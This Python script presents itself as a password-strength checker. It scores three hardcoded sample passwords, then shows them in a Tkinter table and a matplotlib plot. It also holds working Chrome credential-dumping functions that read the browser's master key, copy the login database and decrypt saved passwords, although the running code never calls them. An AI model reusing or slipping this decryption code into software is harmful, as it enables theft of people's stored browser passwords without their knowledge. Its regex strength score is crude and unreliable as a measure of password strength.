import os
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
from tkinter import *
import re
import matplotlib.pyplot as plt

def check(password):
    if len(password) < 8:
        sop = 1
    else:
        sop = 3
    if re.compile('[A-Z]').search(password) is not None:
        sop = sop + 2
    if re.compile('[@_!#$%^&*()<>?/|}{~:]').search(password) is not None:
        sop = sop + 3
    if re.compile('[0-9]').search(password) is not None:
        sop = sop + 2
    return sop


CHROME_PATH_LOCAL_STATE = r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE'])
CHROME_PATH = r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE'])


def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Secret key couldn't be found!")
        return None


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    try:
        # (3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""


def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None


class Table:

    def __init__(self, root):

        for i in range(total_rows):
            for j in range(total_columns):
                self.e = Entry(root, width=20, fg='black',
                               font=('Arial', 14, 'bold'))

                self.e.grid(row=i, column=j)
                self.e.insert(END, lst[i][j])


lst = [("ID", 'username', 'password', 'strength of password'),
       (1, 'egzon', 'egzonmanchester', str(check('egzonmanchester'))),
       (2, 'smith', '17.02.2008', str(check('17.02.2008'))),
       (3, 'george', 'Lipjani123$', str(check('Lipjani123$')))]

total_rows = len(lst)
total_columns = len(lst[0])

root = Tk()
t = Table(root)
root.mainloop()

# x axis
x = ["egzonmanchester", "17.02.2008", "Lipjani123$"]
# y axis
y = [check("egzonmanchester"), check("17.02.2008"), check("Lipjani123$")]

# plotting the points
plt.plot(x, y)

plt.xlabel('Passwords')

plt.ylabel('Strength')

plt.title('Graph based on the strength of passwords')

plt.show()
